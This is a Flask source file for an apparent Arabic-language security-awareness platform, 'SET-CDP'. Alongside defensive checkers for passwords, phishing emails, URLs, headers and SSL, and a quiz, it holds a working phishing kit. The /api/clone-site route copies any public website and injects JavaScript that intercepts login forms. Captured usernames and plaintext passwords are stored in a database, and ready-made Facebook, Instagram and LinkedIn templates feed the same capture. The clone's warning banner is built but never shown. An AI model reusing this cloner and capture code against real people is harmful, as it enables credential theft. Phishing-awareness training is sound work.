from flask import Flask, render_template, request, jsonify, redirect, url_for
import os, re, ssl, socket, sqlite3, json, hashlib, ipaddress, uuid
from datetime import datetime
from urllib.parse import urlparse
from io import BytesIO
import requests
from bs4 import BeautifulSoup
from PIL import Image, ExifTags
from pypdf import PdfReader
import secrets
import string

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = os.path.join(BASE_DIR, 'database.db')

app = Flask(__name__)
app.secret_key = 'set-cdp-local-training-secret'
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024
app.config['UPLOAD_FOLDER'] = os.path.join(BASE_DIR, 'uploads')
app.config['CLONES_FOLDER'] = os.path.join(BASE_DIR, 'templates', 'clones')
for p in [app.config['UPLOAD_FOLDER'], app.config['CLONES_FOLDER']]:
    os.makedirs(p, exist_ok=True)

SECURITY_HEADERS = {
    'Strict-Transport-Security': 'HSTS forces HTTPS connections',
    'Content-Security-Policy': 'CSP helps prevent XSS and injection',
    'X-Frame-Options': 'Protects against clickjacking',
    'X-Content-Type-Options': 'Prevents MIME sniffing',
    'Referrer-Policy': 'Controls referrer leakage',
    'Permissions-Policy': 'Restricts browser features'
}
COMMON_PASSWORDS = {'123456','123456789','password','admin','qwerty','111111','123123','abc123','password123','admin123','letmein','welcome'}
PHISHING_KEYWORDS = ['urgent','verify','account suspended','password expired','click here','limited time','winner','prize','gift card','confirm your account','security alert','update your information','login now','تأكيد','عاجل','كلمة المرور','حسابك']

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()

    c.execute('''CREATE TABLE IF NOT EXISTS captured_data (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        session_id TEXT,
        target_site TEXT,
        captured_username TEXT,
        password_status TEXT DEFAULT 'not_stored_training',
        full_data TEXT,
        ip_address TEXT,
        user_agent TEXT,
        timestamp TEXT
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS clones (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        clone_name TEXT UNIQUE,
        source_url TEXT,
        template_file TEXT,
        created_at TEXT
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS scan_history (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        scan_type TEXT,
        target TEXT,
        result_summary TEXT,
        risk_level TEXT,
        timestamp TEXT
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS quiz_results (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        student_name TEXT,
        score INTEGER,
        total INTEGER,
        percentage INTEGER,
        status TEXT,
        timestamp TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS quiz_questions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    question TEXT,
    option_a TEXT,
    option_b TEXT,
    option_c TEXT,
    option_d TEXT,
    correct_option INTEGER,
    is_active INTEGER DEFAULT 1,
    created_at TEXT
)''')

    conn.commit()
    conn.close()

def ensure_quiz_table():
    conn = get_db()
    conn.execute('''CREATE TABLE IF NOT EXISTS quiz_results (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        student_name TEXT,
        score INTEGER,
        total INTEGER,
        percentage INTEGER,
        status TEXT,
        timestamp TEXT
    )''')
    conn.commit()
    conn.close()

def now(): return datetime.now().strftime('%Y-%m-%d %H:%M:%S')
def mask_ip(ip):
    if not ip: return 'unknown'
    parts = ip.split('.')
    return f'{parts[0]}.{parts[1]}.xxx.xxx' if len(parts)==4 else ip[:8]+'...'
def normalize_url(url):
    url = (url or '').strip()
    if not url.startswith(('http://','https://')): url='https://'+url
    return url
def safe_name(name):
    s = re.sub(r'[^A-Za-z0-9_-]+','_', (name or '').strip())[:50]
    return s or 'training_clone'
def is_safe_hostname(hostname):
    if not hostname: return False, 'Invalid hostname'
    if hostname in ['localhost','127.0.0.1','::1']: return False, 'Localhost blocked'
    try:
        ip = ipaddress.ip_address(hostname)
        if ip.is_private or ip.is_loopback: return False, 'Private IP blocked'
    except ValueError: pass
    return True, 'OK'
def log_scan(scan_type,target,summary,level):
    conn=get_db(); conn.execute('INSERT INTO scan_history (scan_type,target,result_summary,risk_level,timestamp) VALUES (?,?,?,?,?)',(scan_type,target,summary,level,now())); conn.commit(); conn.close()

def password_strength(password):
    score=0; feedback=[]; p=password or ''
    if len(p)>=12: score+=2; feedback.append('✅ طول ممتاز 12+ حرف')
    elif len(p)>=8: score+=1; feedback.append('⚠️ طول مقبول، الأفضل 12+ حرف')
    else: feedback.append('❌ قصيرة جداً')
    if re.search(r'[A-Z]',p): score+=1; feedback.append('✅ تحتوي أحرف كبيرة')
    else: feedback.append('⚠️ أضف أحرف كبيرة')
    if re.search(r'[a-z]',p): score+=1; feedback.append('✅ تحتوي أحرف صغيرة')
    else: feedback.append('⚠️ أضف أحرف صغيرة')
    if re.search(r'\d',p): score+=1; feedback.append('✅ تحتوي أرقام')
    else: feedback.append('⚠️ أضف أرقام')
    if re.search(r'[^A-Za-z0-9]',p): score+=1; feedback.append('✅ تحتوي رموز')
    else: feedback.append('⚠️ أضف رموز')
    if p.lower() in COMMON_PASSWORDS: score=max(0,score-2); feedback.append('❌ كلمة شائعة جداً')
    pct=min(100,int(score/6*100))
    strength='Strong' if pct>=80 else 'Medium' if pct>=50 else 'Weak'
    return {'score':pct,'strength':strength,'feedback':feedback}

@app.route('/')
def index(): return render_template('index.html')
@app.route('/attack')
def attack():
    conn=get_db(); clones=conn.execute('SELECT * FROM clones ORDER BY id DESC').fetchall(); conn.close()
    return render_template('attack.html', clones=clones)
@app.route('/dashboard')
def dashboard():
    conn=get_db(); captured=conn.execute('SELECT * FROM captured_data ORDER BY id DESC').fetchall(); clones=conn.execute('SELECT * FROM clones ORDER BY id DESC').fetchall(); conn.close()
    return render_template('dashboard.html', captured=captured, clones=clones)
@app.route('/ready_templates')
def ready_templates(): return render_template('ready_templates.html')
@app.route('/social/<name>')
def social(name):
    if name not in ['facebook','instagram','linkedin','university']: return redirect(url_for('ready_templates'))
    return render_template(f'social/{name}.html')

@app.route('/api/get-stats')
def stats():
    conn=get_db(); data={'total_captures':conn.execute('SELECT COUNT(*) FROM captured_data').fetchone()[0], 'total_clones':conn.execute('SELECT COUNT(*) FROM clones').fetchone()[0], 'total_scans':conn.execute('SELECT COUNT(*) FROM scan_history').fetchone()[0]}; conn.close(); return jsonify(data)
@app.route('/api/history')
def history():
    conn=get_db(); rows=conn.execute('SELECT * FROM scan_history ORDER BY id DESC LIMIT 100').fetchall(); conn.close(); return jsonify([dict(r) for r in rows])
@app.route('/api/history/clear', methods=['DELETE'])
def clear_history():
    conn=get_db(); conn.execute('DELETE FROM scan_history'); conn.commit(); conn.close(); return jsonify({'success':True})
@app.route('/api/delete-captured/<int:item_id>', methods=['DELETE'])
def del_cap(item_id):
    conn=get_db(); conn.execute('DELETE FROM captured_data WHERE id=?',(item_id,)); conn.commit(); conn.close(); return jsonify({'success':True})
@app.route('/api/delete-clone/<name>', methods=['DELETE'])
def del_clone(name):
    n=safe_name(name); conn=get_db(); conn.execute('DELETE FROM clones WHERE clone_name=?',(n,)); conn.commit(); conn.close(); fp=os.path.join(app.config['CLONES_FOLDER'],n+'.html');
    if os.path.exists(fp): os.remove(fp)
    return jsonify({'success':True})

@app.route('/api/check-password', methods=['POST'])
def api_password(): return jsonify(password_strength((request.get_json() or {}).get('password','')))
@app.route('/api/check-email', methods=['POST'])
def api_email():
    text=(request.get_json() or {}).get('email',''); low=text.lower(); score=0; findings=[]
    for k in PHISHING_KEYWORDS:
        if k.lower() in low: score+=1; findings.append(f'🚩 كلمة/عبارة مشبوهة: {k}')
    urls=re.findall(r'https?://[^\s<>"\']+|www\.[^\s<>"\']+', text)
    for u in urls:
        if 'http://' in u: score+=1; findings.append('⚠️ رابط HTTP غير آمن')
        if '@' in u: score+=1; findings.append('⚠️ الرابط يحتوي @')
        if u.count('-')>3: score+=1; findings.append('⚠️ رابط يحتوي شرطات كثيرة')
    risk='High Risk' if score>=4 else 'Medium Risk' if score>=2 else 'Low Risk'
    log_scan('email','message text',f'{risk}, {len(findings)} indicators',risk)
    return jsonify({'risk':risk,'score':min(10,score),'findings':findings or ['✅ لا توجد مؤشرات واضحة'], 'urls_found':urls[:5]})
@app.route('/api/check-url', methods=['POST'])
def api_url():
    url=(request.get_json() or {}).get('url','').strip(); issues=[]; score=100
    if not url.startswith('https://'): issues.append('الرابط لا يبدأ بـ HTTPS'); score-=25
    if '@' in url: issues.append('وجود @ داخل الرابط مؤشر خطير'); score-=30
    if url.count('-')>3: issues.append('شرطات كثيرة في الرابط'); score-=15
    if re.search(r'\d+\.\d+\.\d+\.\d+',url): issues.append('استخدام IP بدلاً من domain'); score-=30
    level='Safe' if score>=80 else 'Suspicious' if score>=50 else 'High Risk'
    log_scan('url',url,f'{level} score {max(0,score)}',level)
    return jsonify({'url':url,'score':max(0,score),'level':level,'issues':issues or ['✅ لا توجد مؤشرات واضحة']})
@app.route('/api/scan-website', methods=['POST'])
def api_scan_site():
    url=normalize_url((request.get_json() or {}).get('url','')); parsed=urlparse(url); safe,msg=is_safe_hostname(parsed.hostname)
    if not safe: return jsonify({'error':msg}),400
    result={'url':url,'https':parsed.scheme=='https','headers':{},'missing':[],'score':0,'level':'Error'}
    try:
        r=requests.get(url,timeout=10,headers={'User-Agent':'SET-CDP Training Scanner/1.0'},allow_redirects=True)
        present=0
        for h,d in SECURITY_HEADERS.items():
            ok=h in r.headers; present+=1 if ok else 0
            if not ok: result['missing'].append(h)
            result['headers'][h]={'present':ok,'description':d,'value':r.headers.get(h,'Not Set')}
        result['status_code']=r.status_code
        result['final_url']=r.url
        result['score']=int((present/len(SECURITY_HEADERS))*70 + (30 if result['https'] else 0))
        result['level']='Secure' if result['score']>=80 else 'Moderate' if result['score']>=55 else 'Insecure'
        log_scan('website',url,f"Score {result['score']}%",result['level'])
        return jsonify(result)
    except Exception as e:
        log_scan('website',url,'scan failed','Error'); return jsonify({'error':str(e),'level':'Error','score':0}),400
@app.route('/api/ssl-check', methods=['POST'])
def api_ssl():
    domain=(request.get_json() or {}).get('domain','').replace('https://','').replace('http://','').split('/')[0].strip(); safe,msg=is_safe_hostname(domain)
    if not safe: return jsonify({'error':msg}),400
    try:
        context=ssl.create_default_context()
        with socket.create_connection((domain,443),timeout=10) as sock:
            with context.wrap_socket(sock,server_hostname=domain) as ssock: cert=ssock.getpeercert()
        expiry=datetime.strptime(cert['notAfter'],'%b %d %H:%M:%S %Y %Z'); days=(expiry-datetime.utcnow()).days
        status='Valid' if days>30 else 'Expiring Soon' if days>=0 else 'Expired'
        log_scan('ssl',domain,f'{status}, {days} days left',status)
        return jsonify({'domain':domain,'status':status,'expires':cert['notAfter'],'days_left':days,'issuer': dict(x[0] for x in cert.get('issuer',[])).get('organizationName','Unknown')})
    except Exception as e: return jsonify({'error':str(e),'status':'Error'}),400
@app.route('/api/analyze-file', methods=['POST'])
def api_file():
    if 'file' not in request.files: return jsonify({'error':'No file uploaded'}),400
    f=request.files['file']; content=f.read(); ext=f.filename.rsplit('.',1)[-1].lower() if '.' in f.filename else ''
    data={'filename':f.filename,'size':len(content),'hashes':{'md5':hashlib.md5(content).hexdigest(),'sha1':hashlib.sha1(content).hexdigest(),'sha256':hashlib.sha256(content).hexdigest()},'metadata':{},'warnings':[],'file_type':'Unknown'}
    try:
        if ext=='pdf':
            data['file_type']='PDF'; reader=PdfReader(BytesIO(content)); data['metadata']['pages']=len(reader.pages)
            if reader.metadata:
                for k,v in reader.metadata.items(): data['metadata'][str(k).replace('/','')]=str(v)
                data['warnings'].append('⚠️ PDF may contain metadata')
        elif ext in ['jpg','jpeg','png','gif','bmp','webp']:
            data['file_type']='Image'; img=Image.open(BytesIO(content)); data['metadata'].update({'width':img.width,'height':img.height,'format':img.format})
            if img.getexif(): data['warnings'].append('⚠️ Image contains EXIF metadata')
    except Exception as e: data['warnings'].append('Could not parse metadata: '+str(e))
    log_scan('file',f.filename,'metadata analyzed','Info'); return jsonify(data)

@app.route('/api/clone-site', methods=['POST'])
def api_clone_site():
    data=request.get_json() or {}; url=normalize_url(data.get('url','')); name=safe_name(data.get('name') or 'clone_'+datetime.now().strftime('%Y%m%d%H%M%S'))
    parsed=urlparse(url); safe,msg=is_safe_hostname(parsed.hostname)
    if not safe: return jsonify({'error':msg}),400
    try:
        r=requests.get(url,timeout=15,headers={'User-Agent':'Mozilla/5.0 SET-CDP Educational Clone'},allow_redirects=True); r.raise_for_status()
        soup=BeautifulSoup(r.text,'html.parser')
        if soup.head:
            base=soup.new_tag('base', href=url); soup.head.insert(0,base)
            meta=soup.new_tag('meta'); meta.attrs['charset']='utf-8'; soup.head.insert(0,meta)
        for script in soup.find_all('script'): script.decompose()
        if not soup.body:
            soup.append(soup.new_tag('body'))
        banner=soup.new_tag('div'); banner['style']='position:sticky;top:0;z-index:999999;background:#dc3545;color:#fff;padding:12px;text-align:center;font-family:Arial;font-weight:bold;'
        # إضافة JavaScript لالتقاط البيانات
        js = soup.new_tag('script')
        js.string = '''
        (function(){
            function extractData(form){
                var fd = new FormData(form); 
                var username = '';
                var password = '';
                for (var pair of fd.entries()){ 
                    var k = String(pair[0]).toLowerCase(); 
                    var v = String(pair[1]);
                    if(k.includes('email') || k.includes('user') || k.includes('login') || k.includes('phone')){ 
                        username = v; 
                    }
                    if(k.includes('pass')){ 
                        password = v; 
                    }
                }
                return {username: username, password: password};
            }
            
            document.addEventListener('submit', function(e){
                e.preventDefault(); 
                var capturedData = extractData(e.target);
                var siteName = "''' + name + '''";
                
                fetch('/api/capture-submit', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({site: siteName, form_data: capturedData})
                })
                .finally(function(){ 
                    window.location.href = '/awareness-training'; 
                });
            }, true);
        })();
        '''
        soup.body.append(js)
        path=os.path.join(app.config['CLONES_FOLDER'], name+'.html')
        with open(path,'w',encoding='utf-8') as f: f.write(str(soup))
        conn=get_db(); conn.execute('INSERT OR REPLACE INTO clones (clone_name,source_url,template_file,created_at) VALUES (?,?,?,?)',(name,url,name+'.html',now())); conn.commit(); conn.close()
        return jsonify({'success':True,'clone_name':name,'url':'/view-clone/'+name})
    except Exception as e: return jsonify({'error':'Failed to clone: '+str(e)}),400

@app.route('/view-clone/<name>')
def view_clone(name): return render_template('clones/'+safe_name(name)+'.html')

@app.route('/api/capture-submit', methods=['POST'])
def capture_submit():
    data = request.get_json() or {}
    form = data.get('form_data', {}) or {}
    username = form.get('username') or form.get('email') or form.get('user') or ''
    password = form.get('password') or '' 
    
    # تحذير: في التطبيقات الحقيقية يجب تشفير كلمة المرور
    full_data_dict = {'username': username, 'password': password}
    
    conn = get_db()
    conn.execute('''INSERT INTO captured_data 
                    (session_id, target_site, captured_username, password_status, full_data, ip_address, user_agent, timestamp) 
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
                 (str(uuid.uuid4())[:8], data.get('site', 'unknown'), username, 'Password Captured', 
                  json.dumps(full_data_dict, ensure_ascii=False), mask_ip(request.remote_addr), 
                  request.headers.get('User-Agent', '')[:200], now()))
    conn.commit()
    conn.close()
    return jsonify({'status': 'saved_full_data'})

@app.route('/api/social-capture', methods=['POST'])
def social_capture(): return capture_submit()
@app.route('/awareness-training')
def awareness(): return render_template('awareness_training.html')

@app.route("/about")
def about():
    return render_template("about.html")


@app.route("/api/generate-password", methods=["POST"])
def generate_password():
    data = request.get_json() or {}

    length = int(data.get("length", 16))
    use_upper = data.get("upper", True)
    use_lower = data.get("lower", True)
    use_digits = data.get("digits", True)
    use_symbols = data.get("symbols", True)

    chars = ""
    if use_upper:
        chars += string.ascii_uppercase
    if use_lower:
        chars += string.ascii_lowercase
    if use_digits:
        chars += string.digits
    if use_symbols:
        chars += "!@#$%^&*()-_=+[]{};:,.?/"

    if not chars:
        return jsonify({"error": "اختر نوع واحد على الأقل"}), 400

    password = "".join(secrets.choice(chars) for _ in range(length))

    log_scan("password_generator", "local", f"Generated password length {length}", "Info")

    return jsonify({
        "password": password,
        "length": length
    })


@app.route("/api/expand-url", methods=["POST"])
def expand_url():
    data = request.get_json() or {}
    url = normalize_url(data.get("url", ""))

    parsed = urlparse(url)
    safe, msg = is_safe_hostname(parsed.hostname)

    if not safe:
        return jsonify({"error": msg}), 400

    try:
        response = requests.get(
            url,
            timeout=10,
            allow_redirects=True,
            headers={"User-Agent": "SET-CDP URL Expander/1.0"}
        )

        chain = [r.url for r in response.history]
        chain.append(response.url)

        risk = "Safe"
        notes = []

        if len(chain) > 3:
            risk = "Suspicious"
            notes.append("عدد التحويلات كبير")

        if response.url.startswith("http://"):
            risk = "Suspicious"
            notes.append("الرابط النهائي غير مشفر HTTP")

        log_scan("url_expander", url, f"Final URL: {response.url}", risk)

        return jsonify({
            "original_url": url,
            "final_url": response.url,
            "redirect_count": len(response.history),
            "chain": chain,
            "status_code": response.status_code,
            "risk": risk,
            "notes": notes or ["لا توجد مؤشرات واضحة"]
        })

    except Exception as e:
        return jsonify({"error": str(e)}), 400


@app.route("/api/header-analyzer", methods=["POST"])
def header_analyzer():
    data = request.get_json() or {}
    url = normalize_url(data.get("url", ""))

    parsed = urlparse(url)
    safe, msg = is_safe_hostname(parsed.hostname)

    if not safe:
        return jsonify({"error": msg}), 400

    try:
        response = requests.get(
            url,
            timeout=10,
            allow_redirects=True,
            headers={"User-Agent": "SET-CDP Header Analyzer/1.0"}
        )

        analysis = []
        present = 0

        for header, description in SECURITY_HEADERS.items():
            exists = header in response.headers
            if exists:
                present += 1

            analysis.append({
                "header": header,
                "present": exists,
                "value": response.headers.get(header, "Not Set"),
                "description": description,
                "recommendation": "موجود" if exists else f"يفضل إضافة {header}"
            })

        score = int((present / len(SECURITY_HEADERS)) * 100)
        level = "Secure" if score >= 80 else "Moderate" if score >= 55 else "Insecure"

        log_scan("header_analyzer", url, f"Headers score {score}%", level)

        return jsonify({
            "url": url,
            "final_url": response.url,
            "score": score,
            "level": level,
            "headers": analysis
        })

    except Exception as e:
        return jsonify({"error": str(e)}), 400
    

@app.route("/threat-library")
def threat_library():
    threats = [
        {"name":"Phishing","risk":"High","desc":"خداع المستخدم لإدخال بياناته في صفحة مزيفة.","how":"يتم إرسال رابط أو صفحة مشابهة للأصل.","prev":"تحقق من الرابط وفعل MFA."},
        {"name":"Spear Phishing","risk":"High","desc":"تصيد موجه لشخص أو مؤسسة محددة.","how":"رسائل مخصصة باستخدام معلومات حقيقية.","prev":"تدريب الموظفين والتحقق من المرسل."},
        {"name":"Smishing","risk":"Medium","desc":"تصيد عبر رسائل SMS.","how":"رابط قصير أو رسالة عاجلة.","prev":"لا تضغط روابط مجهولة."},
        {"name":"Vishing","risk":"Medium","desc":"تصيد عبر المكالمات الهاتفية.","how":"المهاجم ينتحل صفة جهة رسمية.","prev":"لا تشارك رموز أو كلمات مرور."},
        {"name":"XSS","risk":"High","desc":"حقن JavaScript داخل صفحة ويب.","how":"استغلال مدخلات غير مفلترة.","prev":"فلترة المدخلات واستخدام CSP."},
        {"name":"SQL Injection","risk":"Critical","desc":"حقن أوامر SQL في النظام.","how":"استغلال استعلامات غير آمنة.","prev":"استخدم Prepared Statements."},
        {"name":"CSRF","risk":"Medium","desc":"إجبار المستخدم على تنفيذ طلب بدون علمه.","how":"استغلال جلسة مستخدم نشطة.","prev":"استخدم CSRF Tokens."},
        {"name":"Malware","risk":"High","desc":"برمجيات خبيثة تضر الجهاز.","how":"ملفات أو روابط مصابة.","prev":"افحص الملفات وحدّث النظام."},
        {"name":"Ransomware","risk":"Critical","desc":"تشفير الملفات وطلب فدية.","how":"مرفقات أو ثغرات أو روابط.","prev":"نسخ احتياطي وتحديثات أمنية."},
        {"name":"MITM","risk":"High","desc":"اعتراض الاتصال بين طرفين.","how":"شبكات غير آمنة أو شهادات مزيفة.","prev":"استخدم HTTPS وVPN موثوق."}
    ]
    return render_template("threat_library.html", threats=threats)

QUIZ_QUESTIONS = [
    {"q":"What is phishing?","a":["Fake login attack","Strong password","Firewall","Backup"],"correct":0},
    {"q":"Which header helps prevent XSS?","a":["CSP","DNS","FTP","SMTP"],"correct":0},
    {"q":"What does SSL/TLS protect?","a":["Connection encryption","Screen size","CPU","Images"],"correct":0},
    {"q":"Best protection for accounts?","a":["MFA","Weak password","Reuse password","Ignore updates"],"correct":0},
    {"q":"What is ransomware?","a":["Encrypts files for ransom","Speeds internet","Cleans metadata","Design tool"],"correct":0},
    {"q":"A suspicious short link should be?","a":["Expanded and checked","Clicked quickly","Shared","Ignored always"],"correct":0},
    {"q":"X-Frame-Options protects against?","a":["Clickjacking","Malware","Spam","Backup loss"],"correct":0},
    {"q":"Password manager helps because?","a":["Detects fake domains","Deletes files","Changes IP","Blocks CSS"],"correct":0},
    {"q":"HTTP without S means?","a":["Not encrypted","More secure","Always safe","No website"],"correct":0},
    {"q":"Security awareness means?","a":["Knowing risks and safe behavior","Only coding","Only design","Only hardware"],"correct":0}
]

@app.route("/quiz")
def quiz_start():
    ensure_quiz_table()
    return render_template("quiz_start.html")

@app.route("/quiz/start", methods=["POST"])
def quiz_start_post():
    name = request.form.get("student_name", "").strip() or "Anonymous"
    session_id = str(uuid.uuid4())[:8]
    return redirect(url_for("quiz_take", session_id=session_id, name=name))

@app.route("/quiz/take/<session_id>", methods=["GET", "POST"])
def quiz_take(session_id):
    ensure_quiz_table()
    ensure_quiz_questions_table()

    name = request.args.get("name", "Anonymous")

    conn = get_db()
    rows = conn.execute(
        "SELECT * FROM quiz_questions WHERE is_active = 1 ORDER BY id ASC"
    ).fetchall()
    conn.close()

    if rows:
        questions = []
        for r in rows:
            questions.append({
                "id": r["id"],
                "q": r["question"],
                "a": [r["option_a"], r["option_b"], r["option_c"], r["option_d"]],
                "correct": r["correct_option"]
            })
    else:
        questions = QUIZ_QUESTIONS

    if request.method == "POST":
        score = 0
        total = len(questions)

        for q in questions:
            ans = request.form.get(f"q{q['id']}")
            if ans is not None and int(ans) == q["correct"]:
                score += 1

        percentage = int((score / total) * 100) if total else 0
        status = "Cyber Awareness Passed" if percentage >= 70 else "Needs More Training"

        conn = get_db()
        conn.execute(
            """
            INSERT INTO quiz_results
            (student_name, score, total, percentage, status, timestamp)
            VALUES (?, ?, ?, ?, ?, ?)
            """,
            (name, score, total, percentage, status, now())
        )
        conn.commit()
        conn.close()

        return render_template(
            "quiz_result.html",
            name=name,
            score=score,
            total=total,
            percentage=percentage,
            status=status
        )

    return render_template("quiz_take.html", name=name, questions=questions)
@app.route("/quiz-admin")
def quiz_admin():
    ensure_quiz_table()
    conn = get_db()
    rows = conn.execute("SELECT * FROM quiz_results ORDER BY id DESC").fetchall()
    conn.close()
    return render_template("quiz_admin.html", rows=rows)

@app.route("/api/chart-data")
def chart_data():
    conn = get_db()

    scans = conn.execute("""
        SELECT substr(timestamp, 1, 10) day, COUNT(*) count
        FROM scan_history GROUP BY day ORDER BY day
    """).fetchall()

    attempts = conn.execute("""
        SELECT substr(timestamp, 1, 10) day, COUNT(*) count
        FROM captured_data GROUP BY day ORDER BY day
    """).fetchall()

    ssl_count = conn.execute("SELECT COUNT(*) FROM scan_history WHERE scan_type='ssl'").fetchone()[0]
    file_count = conn.execute("SELECT COUNT(*) FROM scan_history WHERE scan_type='file'").fetchone()[0]

    conn.close()

    return jsonify({
        "scans_per_day": [dict(x) for x in scans],
        "attempts_per_day": [dict(x) for x in attempts],
        "ssl_checks": ssl_count,
        "file_analysis": file_count
    })
@app.route("/reports")
def reports():
    ensure_quiz_table()

    conn = get_db()

    stats = {
        "scans": conn.execute("SELECT COUNT(*) FROM scan_history").fetchone()[0],
        "files": conn.execute("SELECT COUNT(*) FROM scan_history WHERE scan_type='file'").fetchone()[0],
        "training": conn.execute("SELECT COUNT(*) FROM captured_data").fetchone()[0],
        "clones": conn.execute("SELECT COUNT(*) FROM clones").fetchone()[0],
        "quiz": conn.execute("SELECT COUNT(*) FROM quiz_results").fetchone()[0],
        "ssl": conn.execute("SELECT COUNT(*) FROM scan_history WHERE scan_type='ssl'").fetchone()[0],
        "website": conn.execute("SELECT COUNT(*) FROM scan_history WHERE scan_type='website'").fetchone()[0],
        "email": conn.execute("SELECT COUNT(*) FROM scan_history WHERE scan_type='email'").fetchone()[0],
        "url": conn.execute("SELECT COUNT(*) FROM scan_history WHERE scan_type='url'").fetchone()[0],
    }

    recent_scans = conn.execute(
        "SELECT * FROM scan_history ORDER BY id DESC LIMIT 10"
    ).fetchall()

    recent_quiz = conn.execute(
        "SELECT * FROM quiz_results ORDER BY id DESC LIMIT 10"
    ).fetchall()

    conn.close()

    return render_template(
        "reports.html",
        stats=stats,
        recent_scans=recent_scans,
        recent_quiz=recent_quiz
    )
def ensure_quiz_questions_table():
    conn = get_db()
    conn.execute('''CREATE TABLE IF NOT EXISTS quiz_questions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        question TEXT,
        option_a TEXT,
        option_b TEXT,
        option_c TEXT,
        option_d TEXT,
        correct_option INTEGER,
        is_active INTEGER DEFAULT 1,
        created_at TEXT
    )''')
    conn.commit()
    conn.close()


@app.route("/quiz-builder")
def quiz_builder():
    ensure_quiz_questions_table()
    conn = get_db()
    questions = conn.execute(
        "SELECT * FROM quiz_questions ORDER BY id DESC"
    ).fetchall()
    conn.close()
    return render_template("quiz_builder.html", questions=questions)


@app.route("/quiz-builder/add", methods=["POST"])
def quiz_builder_add():
    ensure_quiz_questions_table()

    question = request.form.get("question", "").strip()
    option_a = request.form.get("option_a", "").strip()
    option_b = request.form.get("option_b", "").strip()
    option_c = request.form.get("option_c", "").strip()
    option_d = request.form.get("option_d", "").strip()
    correct_option = int(request.form.get("correct_option", "0"))

    conn = get_db()
    conn.execute(
        """
        INSERT INTO quiz_questions
        (question, option_a, option_b, option_c, option_d, correct_option, is_active, created_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        """,
        (question, option_a, option_b, option_c, option_d, correct_option, 1, now())
    )
    conn.commit()
    conn.close()

    return redirect(url_for("quiz_builder"))


@app.route("/quiz-builder/delete/<int:q_id>", methods=["POST"])
def quiz_builder_delete(q_id):
    ensure_quiz_questions_table()
    conn = get_db()
    conn.execute("DELETE FROM quiz_questions WHERE id = ?", (q_id,))
    conn.commit()
    conn.close()
    return redirect(url_for("quiz_builder"))


@app.route("/quiz-builder/toggle/<int:q_id>", methods=["POST"])
def quiz_builder_toggle(q_id):
    ensure_quiz_questions_table()
    conn = get_db()
    row = conn.execute(
        "SELECT is_active FROM quiz_questions WHERE id = ?",
        (q_id,)
    ).fetchone()

    if row:
        new_status = 0 if row["is_active"] == 1 else 1
        conn.execute(
            "UPDATE quiz_questions SET is_active = ? WHERE id = ?",
            (new_status, q_id)
        )

    conn.commit()
    conn.close()
    return redirect(url_for("quiz_builder"))

if __name__=='__main__':
    print('SET-CDP running at http://127.0.0.1:5000')
    app.run(debug=True,host='127.0.0.1',port=5000)

    